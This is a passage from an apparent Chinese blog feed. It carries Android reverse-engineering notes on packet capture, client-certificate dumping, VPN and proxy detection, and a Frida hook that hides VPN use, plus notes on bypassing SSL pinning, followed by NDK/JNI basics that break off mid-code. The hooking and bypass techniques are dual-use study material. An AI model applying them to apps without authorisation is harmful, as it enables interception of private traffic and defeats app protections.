方法来获得私钥和证书的时候，会被脚本拦截提取返回的私钥和证书数据，然后storeP12()函数，将提取出来的私钥和证书组合起来，存储为一个.p12文件，并使用密码r0ysue进行加密写入指定文件中。</p><h2 id="r0capture"><a href="#r0capture" class="headerlink" title="r0capture"></a>r0capture</h2><p>具体使用见github官方文档</p><p>如果r0capture跑不起来：</p><ul><li>attch加载py</li><li>frida跑script.js</li><li>-w 3 等待几秒</li></ul><p>实现主要是从hook底层函数出发</p><p><strong>TCP/Socket抓包</strong></p><p>java.net.SocketOutputStream.socketWrite0和java.net.SocketInputStream.socketRead0</p><p><img src="2025-01-15-Android抓包/image-20240701202339677.png" alt="image-20240701202339677"></p><p> <strong>SSL/so抓包</strong></p><p>对于Native层收发包函数的hook和存储 也就是SSL库中的，SSL_read和SSL_write的收发内容</p><p><img src="2025-01-15-Android抓包/image-20240701202326570.png" alt="image-20240701202326570"></p><p><strong>客户端证书</strong></p><p>在服务器校验客户端的情况下 帮助dump客户端证书并保存为p12格式 密码为rysue</p><p><img src="2025-01-15-Android抓包/image-20240701202136809.png" alt="image-20240701202136809"></p><p><strong>证书定位</strong>、</p><p>所有SSL pining都必定打开文件计算哈希</p><p>hook所有文件打开操作 从调用栈定位混淆位置  </p><p><img src="2025-01-15-Android抓包/image-20240701202237286.png" alt="image-20240701202237286"></p><h2 id="不走代理的检测"><a href="#不走代理的检测" class="headerlink" title="不走代理的检测"></a>不走代理的检测</h2><p>在HttpURLConnection和okhttp框架中可以指定不走代理。</p><p>在HttpURLConnection中添加openConnection(Proxy.NO_PROXT)</p><p><img src="2025-01-15-Android抓包/image-20240703123900637.png" alt="image-20240703123900637"></p><p>在okhttp框架中添加.proxy(Proxy.NO_PROXY)</p><p><img src="2025-01-15-Android抓包/image-20240703124030288.png" alt="image-20240703124030288"></p><p>通过如下命令可以设置代理</p><p><img src="2025-01-15-Android抓包/image-20240703125011490.png" alt="image-20240703125011490"></p><p><strong>VPN检测</strong></p><p>VPN检测是指应用程序或系统检查用户是否正在使用虚拟专用网络（Virtual Private Network, VPN）的一种技术。当用户使用VPN时，他们的网络流量会被加密并通过一个远程服务器路由，这可以隐藏用户的实际IP地址和位置信息，同时保护数据的安全性和隐私。</p><p><strong>原理</strong></p><p>当客户端运行VPN虚拟隧道协议时，会在当前节点创建基于<code>eth</code>之上的<code>tun0</code>接口或<code>ppp0</code>接口。这些接口是用于建立虚拟网络连接的特殊网络接口。</p><p>VPN 协议大多是作用在 OSI 的第二层和第三层之间，由此可见VPN能抓到代理方式的所有的包</p><p>代码检测：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">Check_Vpn1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Enumeration&lt;NetworkInterface&gt; networkInterfaces = NetworkInterface.getNetworkInterfaces();</span><br><span class="line">            <span class="keyword">if</span> (networkInterfaces == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Iterator</span> <span class="variable">it</span> <span class="operator">=</span> Collections.list(networkInterfaces).iterator();</span><br><span class="line">            <span class="keyword">while</span> (it.hasNext()) &#123;</span><br><span class="line">                <span class="type">NetworkInterface</span> <span class="variable">networkInterface</span> <span class="operator">=</span> (NetworkInterface) it.next();</span><br><span class="line">                <span class="keyword">if</span> (networkInterface.isUp() &amp;&amp; !networkInterface.getInterfaceAddresses().isEmpty()) &#123;</span><br><span class="line">                    Log.d(<span class="string">&quot;zj595&quot;</span>, <span class="string">&quot;isVpn NetworkInterface Name: &quot;</span> + networkInterface.getName());</span><br><span class="line">                    <span class="keyword">if</span> (Intrinsics.areEqual(networkInterface.getName(), <span class="string">&quot;tun0&quot;</span>) || Intrinsics.areEqual(networkInterface.getName(), <span class="string">&quot;ppp0&quot;</span>) || Intrinsics.areEqual(networkInterface.getName(), <span class="string">&quot;p2p0&quot;</span>) || Intrinsics.areEqual(networkInterface.getName(), <span class="string">&quot;ccmni0&quot;</span>)) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable th) &#123;</span><br><span class="line">            th.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">Check_Vpn2</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> z;</span><br><span class="line">        String networkCapabilities;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">systemService</span> <span class="operator">=</span> getApplicationContext().getSystemService(<span class="string">&quot;connectivity&quot;</span>);</span><br><span class="line">            Intrinsics.checkNotNull(systemService, <span class="string">&quot;null cannot be cast to non-null type android.net.ConnectivityManager&quot;</span>);</span><br><span class="line">            <span class="type">ConnectivityManager</span> <span class="variable">connectivityManager</span> <span class="operator">=</span> (ConnectivityManager) systemService;</span><br><span class="line">            <span class="type">NetworkCapabilities</span> <span class="variable">networkCapabilities2</span> <span class="operator">=</span> connectivityManager.getNetworkCapabilities(connectivityManager.getActiveNetwork());</span><br><span class="line">            Log.i(<span class="string">&quot;zj595&quot;</span>, <span class="string">&quot;networkCapabilities -&gt; &quot;</span> + networkCapabilities2);</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">z2</span> <span class="operator">=</span> networkCapabilities2 != <span class="literal">null</span> &amp;&amp; networkCapabilities2.hasTransport(<span class="number">4</span>);</span><br><span class="line">            <span class="comment">// 检查网络能力是否包含 &quot;WIFI|VPN&quot; </span></span><br><span class="line">            <span class="keyword">if</span> (networkCapabilities2 != <span class="literal">null</span> &amp;&amp; (networkCapabilities = networkCapabilities2.toString()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (StringsKt.contains$<span class="keyword">default</span>((CharSequence) networkCapabilities, (CharSequence) <span class="string">&quot;WIFI|VPN&quot;</span>, <span class="literal">false</span>, <span class="number">2</span>, (Object) <span class="literal">null</span>)) &#123;</span><br><span class="line">                    z = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">return</span> !z || z2;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            z = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">if</span> (z) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>anti</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">hook_vpn</span><span class="params">()</span> &#123;</span><br><span class="line">    Java.perform(function () &#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">NetworkInterface</span> <span class="operator">=</span> Java.use(<span class="string">&quot;java.net.NetworkInterface&quot;</span>);</span><br><span class="line">        NetworkInterface.getName.implementation = function () &#123;</span><br><span class="line">            <span class="type">var</span> <span class="variable">name</span> <span class="operator">=</span> <span class="built_in">this</span>.getName();  <span class="comment">//hook java层的getName方法</span></span><br><span class="line">            console.log(<span class="string">&quot;name: &quot;</span> + name);</span><br><span class="line">            <span class="keyword">if</span> (name === <span class="string">&quot;tun0&quot;</span> || name === <span class="string">&quot;ppp0&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;rmnet_data0&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> name;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">var</span> <span class="variable">NetworkCapabilities</span> <span class="operator">=</span> Java.use(<span class="string">&quot;android.net.NetworkCapabilities&quot;</span>);</span><br><span class="line">        NetworkCapabilities.hasTransport.implementation = function () &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        NetworkCapabilities.appendStringRepresentationOfBitMaskToStringBuilder.implementation = function (sb, bitMask, nameFetcher, separator) &#123;</span><br><span class="line">            <span class="keyword">if</span> (bitMask == <span class="number">18</span>) &#123;</span><br><span class="line">                console.log(<span class="string">&quot;bitMask&quot;</span>, bitMask);</span><br><span class="line">                sb.append(<span class="string">&quot;WIFI&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                console.log(sb, bitMask);</span><br><span class="line">                <span class="built_in">this</span>.appendStringRepresentationOfBitMaskToStringBuilder(sb, bitMask, nameFetcher, separator);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一种检测框架</p><p><img src="2025-01-15-Android抓包/image-20240703131243570.png" alt="image-20240703131243570"></p><p>当开启vpn时，getName获得网络设备名称=<strong>tun0</strong> 主要检测java.net.NetworkInterface.getName</p><p>第二组检测<img src="2025-01-15-Android抓包/image-20240709195852130.png" alt="image-20240709195852130"></p><p>如果开启vpn，输出会有vpn字眼</p><p><strong>connectionProxyDictionary</strong> </p><p>设置 connectionProxyDictionary 变量，可以防止 Burp、Charles 抓包工具抓包 仅限设置系统代理的时候防止抓包，第三方代理工具仍然可以抓得到包，比如shadowrocket】</p><p> <a href="https://www.jianshu.com/p/1afce4a6bd7e">connectionProxyDictionary 笔记 - 简书</a></p><p> <a href="https://github.com/cherubstar/iOSEnvDetection/blob/d8fe85956c62446a663e69915bc4f1cbfce2d0a0/EnvDetection/EnvDetection/AgentDetection/AgentDetection.m#L94">iOSEnvDetection/EnvDetection/EnvDetection/AgentDet…</a></p><h2 id="HttpURLConnection"><a href="#HttpURLConnection" class="headerlink" title="HttpURLConnection"></a>HttpURLConnection</h2><h3 id="基本框架"><a href="#基本框架" class="headerlink" title="基本框架"></a>基本框架</h3><p>这种通信框架一般在子线程中进行。其中HttpsRequest封装了HttpURLConnection实现</p><p><img src="2025-01-15-Android抓包/image-20240703124824748.png" alt="image-20240703124824748"></p><p><strong>HttpURLConnection基本框架</strong></p><p><img src="2025-01-15-Android抓包/image-20240703125108363.png" alt="image-20240703125108363"></p><p><img src="2025-01-15-Android抓包/image-20240703130214141.png" alt="image-20240703130214141"></p><p> <img src="2025-01-15-Android抓包/image-20240703130315196.png" alt="image-20240703130315196"></p><h3 id="自吐"><a href="#自吐" class="headerlink" title="自吐"></a>自吐</h3><p>从基本框架知道，主要信息在HttpURLConnection对象和URL构造函数中，所以可以hook这两个函数</p><p>注意HttpURLConnection是抽象类，所在的类路径是<code>com.android.okhttp.internal.huc.HttpURLConnectionImpl</code>(可以通过frida hook和objection的打印返回值验证)</p><h3 id="证书验证"><a href="#证书验证" class="headerlink" title="证书验证"></a>证书验证</h3><p><img src="2025-01-15-Android抓包/image-20240703131207369.png" alt="image-20240703131207369"></p><p>HttpURLConnection要实现app对证书的校验需要添加如下部分</p><p><img src="2025-01-15-Android抓包/image-20240703131532884.png" alt="image-20240703131532884"></p><p>在TrustManager中实现验证的代码逻辑。</p><p>这里的sslContext.getSocketFactory是证书检测 添加这个的前提是SSLContext.init的第二个参数要定义一个TrustMeanager对象,在这个里面写证书校验逻辑</p><p>然后对trustmanager重写方法</p><p><img src="2025-01-15-Android抓包/image-20240703131616267.png" alt="image-20240703131616267"></p><p>客户端校验客户端主要在checkServerTrusted实现，先从app中内置的证书中获得正确的公钥，然后和得到的证书链的证书公钥进行比较验证。</p><p><img src="2025-01-15-Android抓包/image-20240703131651749.png" alt="image-20240703131651749"></p><p>在setHostnameVerifier(VERIFY)也可以进行证书校验操作</p><p><img src="2025-01-15-Android抓包/image-20240703142809363.png" alt="image-20240703142809363"></p><h3 id="证书校验绕过"><a href="#证书校验绕过" class="headerlink" title="证书校验绕过"></a>证书校验绕过</h3><p>就是hook那两个关键函数就行setSSLSocketFactory和setHostnameVerifier</p><h2 id="okhttp3"><a href="#okhttp3" class="headerlink" title="okhttp3"></a>okhttp3</h2><p>首先xml中申请一个可能网络通信的权限</p><p>然后app/build.gradle中的dependencies节点中增加对第三方库的引用</p><p><code>implementation(&quot;com.squareup.okhttp3:okhttp:3.12.0&quot;)</code></p><p><strong>基本框架</strong></p><p><img src="2025-01-15-Android抓包/image-20240703145349726.png" alt="image-20240703145349726"></p><p>如果要是post请求 添加如下代码</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FormBody formBody = new FormBody.Builder().<span class="built_in">add</span>(<span class="string">&quot;name&quot;</span>，<span class="string">&quot;value&quot;</span>).<span class="built_in">add</span>()<span class="built_in">..</span>. .buidl();</span><br><span class="line"></span><br><span class="line">Request中.post(formBody)</span><br></pre></td></tr></table></figure><h3 id="拦截器"><a href="#拦截器" class="headerlink" title="拦截器"></a>拦截器</h3><p>okhttp通过拦截器Interceptor完成监控管理，重写和重试请求。每个网络请求无论是get还是post都会经过okhttp的拦截器，所以Interceptor是个很好的hook点，可以hook到请求和响应。</p><p>使用拦截器：</p><p>在定义的客户端对象中添加<code>.addNetworkInterceptor(new xxxx())</code>其中new xxx()是创建实现Interceptor的类对象。</p><p>当一个app没有使用Interceptor，那如何通过Interceptor进行打印请求响应呢？ 操作如下</p><ul><li>把实现Interceptor的类放入Android Studio中编译成apk，提取出来里面的dex文件</li><li>编写frida脚本 </li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Java.<span class="title function_ invoke__">openClassFile</span>(<span class="string">&quot;/data/local/tmp/xxx.dex&quot;</span>).<span class="title function_ invoke__">load</span>();</span><br><span class="line"><span class="keyword">var</span> interceptor=Java.<span class="keyword">use</span>(<span class="string">&quot;拦截器类路径&quot;</span>)；</span><br><span class="line"><span class="keyword">var</span> Builder=Java.<span class="keyword">use</span>(<span class="string">&quot;Build类路径&quot;</span>);</span><br><span class="line">Builder.build.implementation=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> this.<span class="title function_ invoke__">addNetworkInterceptor</span>(interceptor.<span class="variable">$new</span>().<span class="title function_ invoke__">build</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="证书检测"><a href="#证书检测" class="headerlink" title="证书检测"></a>证书检测</h3><p>在客户端对象处添加如下</p><p><img src="2025-01-15-Android抓包/image-20240703160957498.png" alt="image-20240703160957498"></p><p>另外一个校验点：CertificatePinner，证书锁定</p><p><img src="2025-01-15-Android抓包/image-20240703180155577.png" alt="image-20240703180155577"></p><p>主要是调用这个CertificatePinner类下的check方法进行证书hash加密后的比较校验，然后这里的sslSocketFactory参数中的trustManager是经过一系列操作(如新建一个keystore存放证书等)后正确的证书的数据，应该和CertificatePinner中参数的sha256进行比较校验。</p><h3 id="证书绕过"><a href="#证书绕过" class="headerlink" title="证书绕过"></a>证书绕过</h3><p>也就是hook掉上面有关证书验证的那三个函数。</p><p>当出现okhttp3混淆时候，就需要关注一些相关系统函数，然后看他的调用栈找到关键的校验函数，如CertificatePinner的check函数</p><p>比较常见的实现https类的各自证书校验方式：</p><p><img src="2025-01-15-Android抓包/905443_VRDJKTB2QDRSNQ6.png" alt="image-20211205163031752"></p><h2 id="基于xposed的两个绕过ssl-pinning的模块"><a href="#基于xposed的两个绕过ssl-pinning的模块" class="headerlink" title="基于xposed的两个绕过ssl pinning的模块"></a>基于xposed的两个绕过ssl pinning的模块</h2><p><img src="2025-01-15-Android抓包/905443_GQTKJ7GVBKAX8FB.png" alt="img"></p><h2 id="jni层SSL系统源码自吐"><a href="#jni层SSL系统源码自吐" class="headerlink" title="jni层SSL系统源码自吐"></a>jni层SSL系统源码自吐</h2><p>hook点有两个部分，如下<img src="2025-01-15-Android抓包/image-20240704210621418.png" alt="image-20240704210621418"></p><p>libssl.so中的SSL_write和SSL_read。这两个是native层实现的函数，参数buf是未经过操作的请求数据</p><p>libc.so的write和read中的buf参数则是经过处理后的请求数据，可以通过这个打印调用栈找到SSL_write和SSL_read或者app自实现的实现相应功能的函数。</p>]]></content>
      
      
      <categories>
          
          <category> Android抓包 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android逆向 </tag>
            
            <tag> 抓包 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NDK学习</title>
      <link href="/posts/f0867805.html"/>
      <url>/posts/f0867805.html</url>
      
        <content type="html"><![CDATA[<h1 id="NDK"><a href="#NDK" class="headerlink" title="NDK"></a>NDK</h1><p>linker：自定义的so解析系统，可以用自定义的linker系统来解析修改so结构的so文件</p><p>CMake：一款外部构建工具。指导so编译</p><p>LLDB：AndroidStudio用于调式原生代码的调试程序</p><p>NDK ,CMake 、 LLDB的作用：<a href="https://developer.android.com/ndk/guides">https://developer.android.com/ndk/guides</a></p><p>ABI与指令集：<a href="https://developer.android.com/ndk/guides/abis">https://developer.android.com/ndk/guides/abis</a></p><h2 id="NDK与Java工程的区别"><a href="#NDK与Java工程的区别" class="headerlink" title="NDK与Java工程的区别"></a>NDK与Java工程的区别</h2><ul><li><p>Java代码中加载so和声明所需要使用的so中的函数</p></li><li><p>编写CMakeLists.txt和C文件</p></li><li><p>build.gradle中添加一些代码</p><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">defaultConfig</span> &#123;</span><br><span class="line">       。。。。。。</span><br><span class="line">        <span class="keyword">externalNativeBuild</span> &#123;</span><br><span class="line">            <span class="keyword">cmake</span> &#123;</span><br><span class="line">                cppFlags &#x27;<span class="operator">-</span>std<span class="operator">=</span>c<span class="operator">++</span><span class="number">11</span>&#x27;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">ndk</span>&#123;</span><br><span class="line">        abiFilters&#x27;armeabi<span class="operator">-</span>v7a<span class="string">&#x27;,&#x27;</span>arm64<span class="operator">-</span>v8a<span class="string">&#x27;,&#x27;</span>x86<span class="string">&#x27;,&#x27;</span>x86_64&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">externalNativeBuild</span> &#123;</span><br><span class="line">        <span class="keyword">cmake</span> &#123;</span><br><span class="line">            path file(<span class="symbol">&#x27;src</span><span class="operator">/</span>main<span class="operator">/</span>cpp<span class="operator">/</span>CMakeLists.txt&#x27;)</span><br><span class="line">            version &#x27;<span class="number">3.22</span><span class="number">.1</span>&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ul><p><img src="2025-01-15-NDK学习/image-20240327192718501.png" alt="image-20240327192718501"></p><p><strong>add_definitions(“-fvisibility=hidden”)</strong> 去掉符号表</p><p><code>__attribute((__annotate__(&quot;fla&quot;))</code>对指定函数fla混淆</p><p><code>__attribute__((visibility(&quot;default&quot;)))</code>显示在导出表中</p><h2 id="第一个NDK工程"><a href="#第一个NDK工程" class="headerlink" title="第一个NDK工程"></a>第一个NDK工程</h2><ul><li><p>native函数的声明<br>声明形式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title function_">stringFromJNI</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure></li><li><p>JNI函数的静态注册规则<br>静态注册后函数名字为：</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Java_包名<span class="literal">_</span>类名<span class="literal">_</span>函数名</span><br></pre></td></tr></table></figure></li><li><p>extern “C” JNIEXPORT jstring JNICALL<br>extern  “C” ==&gt; 以编译c代码的形式来编译，防止加上其他的修饰符，符号等。<br>JNIEXPORT ==&gt; <strong>attribute</strong> ((visibility (“default”))) 让函数名在导出表中出现，静态注册名字一定要出现在导出表<br>jstring ==&gt; 返回值</p></li><li><p>指定编译后so的名字</p><p>修改如下位置即可：<br><img src="2025-01-15-NDK学习/image-20240204144200776.png" alt="image-20240204144200776"></p></li></ul><p><img src="2025-01-15-NDK学习/image-20240204144230665.png" alt="image-20240204144230665"></p><p><img src="2025-01-15-NDK学习/image-20240204144308333.png" alt="image-20240204144308333"></p><h2 id="so中常用的Log输出"><a href="#so中常用的Log输出" class="headerlink" title="so中常用的Log输出"></a>so中常用的Log输出</h2><p>在AS中，在.cpp文件中可以通过以下形式进行输出：</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">头文件：</span><br><span class="line">#include &lt;android/<span class="keyword">log</span>.h&gt;</span><br><span class="line"></span><br><span class="line">#define <span class="built_in">TAG</span> <span class="string">&quot;zxk1ng&quot;</span> </span><br><span class="line">#define LOGD(<span class="params">...</span>) __android_log_print(ANDROID_LOG_DEBUG, <span class="built_in">TAG</span>, __VA_ARGS__) ; </span><br><span class="line">#define LOGI(<span class="params">...</span>) __android_log_print(ANDROID_LOG_INFO, <span class="built_in">TAG</span>, __VA_ARGS__) ; </span><br><span class="line">#define LOGE(<span class="params">...</span>) __android_log_print(ANDROID_LOG_ERROR, <span class="built_in">TAG</span>, __VA_ARGS__);</span><br><span class="line"></span><br><span class="line">LOGD(<span class="string">&quot;JNI_native_xxx %d %d&quot;</span>,<span class="number">100</span>,<span class="number">200</span>);</span><br><span class="line">等价于</span><br><span class="line">__android_log_print(ANDROID_LOG_DEBUG,<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;JNI_native_xxx %d %d&quot;</span>,<span class="number">100</span>,<span class="number">200</span>);</span><br></pre></td></tr></table></figure><h2 id="JNI-OnLoad的定义"><a href="#JNI-OnLoad的定义" class="headerlink" title="JNI_OnLoad的定义"></a>JNI_OnLoad的定义</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">JNIEXPORT jint <span class="title function_">JNI_OnLoad</span><span class="params">(JavaVM *vm,<span class="keyword">void</span> *reserved)</span>&#123;</span><br><span class="line">    JNIEnv *env = nullptr;</span><br><span class="line">    <span class="keyword">if</span>(vm-&gt;GetEnv((<span class="keyword">void</span> **)&amp;env,JNI_VERSION_1_6)!=JNI_OK)&#123;</span><br><span class="line">        LOGD(<span class="string">&quot;GetEnv failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> JNI_VERSION_1_6; <span class="comment">//返回jni版本值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个so中可以不定义JNI_OnLoad，一旦定义了JNI_OnLoad，在so被加载的时候会自动执行</p><p>必须返回JNI版本，JNI_VERSION_1_6</p><h2 id="JavaVM"><a href="#JavaVM" class="headerlink" title="JavaVM"></a>JavaVM</h2><p>JavaVM每个进程中只有一份</p><p>JavaVM是一个结构体，其中有两个重要成员</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//子线程获得env环境 </span></span><br><span class="line">jint <span class="title function_">AttachCurrentThread</span><span class="params">(JNIEnv** p_env, <span class="keyword">void</span>* thr_args)</span></span><br><span class="line">  &#123; <span class="keyword">return</span> functions-&gt;AttachCurrentThread(<span class="built_in">this</span>, p_env, thr_args); &#125;</span><br><span class="line"><span class="comment">//主线程中获得env环境    </span></span><br><span class="line">jint <span class="title function_">GetEnv</span><span class="params">(<span class="keyword">void</span>** env, jint version)</span></span><br><span class="line">  &#123; <span class="keyword">return</span> functions-&gt;GetEnv(<span class="built_in">this</span>, env, version); &#125;</span><br></pre></td></tr></table></figure><h3 id="JavaVM获取方式"><a href="#JavaVM获取方式" class="headerlink" title="JavaVM获取方式"></a>JavaVM获取方式</h3><p>1）JNI_OnLoad和JNI_OnUnLoad的第一个参数</p><p>2）env-&gt;GetJavaVM</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">JNIEXPORT </span><span class="keyword">jint </span><span class="keyword">JNI_OnLoad(JavaVM* </span>vm, void* reserved);</span><br><span class="line"><span class="keyword">JNIEXPORT </span>void <span class="keyword">JNI_OnUnload(JavaVM* </span>vm, void* reserved);</span><br><span class="line"></span><br><span class="line"><span class="keyword">JavaVM </span>*<span class="keyword">jvm;</span></span><br><span class="line"><span class="keyword"></span>env-&gt;GetJavaVM(&amp;<span class="keyword">jvm);</span></span><br><span class="line"><span class="keyword"></span>LOGD(<span class="string">&quot;JavaVM: %p&quot;</span>,<span class="keyword">jvm);</span></span><br></pre></td></tr></table></figure><h2 id="JNIEnv"><a href="#JNIEnv" class="headerlink" title="JNIEnv"></a>JNIEnv</h2><p>JNIEnv每个线程中都有一份</p><h3 id="JNIEnv获取"><a href="#JNIEnv获取" class="headerlink" title="JNIEnv获取"></a>JNIEnv获取</h3><ul><li>函数静态/动态注册传的第一个参数</li><li>vm-&gt;GetEnv</li><li>globalVM-&gt;AttachCurrentThread 子线程获得env</li></ul><h2 id="SO函数注册"><a href="#SO函数注册" class="headerlink" title="SO函数注册"></a>SO函数注册</h2><p>1）JNI函数的静态注册必须遵循一定的命名规则，一 般 是 Java<em>包 名 </em> 类名 _ 方法名 </p><p>系统会通过dlopen加载对应的so，通过dlsym来获取指定名字的函数地址，然后调用静态注册的jni函数， 静态注册函数必然在导出表里 </p><p>2）JNI函数的动态注册通过 env-&gt;RegisterNatives 注册函数，通常在 JNI_OnLoad中注册。</p><p>JNINativeMethod  结构体 内容如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* name;   java层函数名</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* signature;  函数签名 由参数类型返回类型决定</span><br><span class="line">    <span class="type">void</span>*       fnPtr;   函数指针</span><br><span 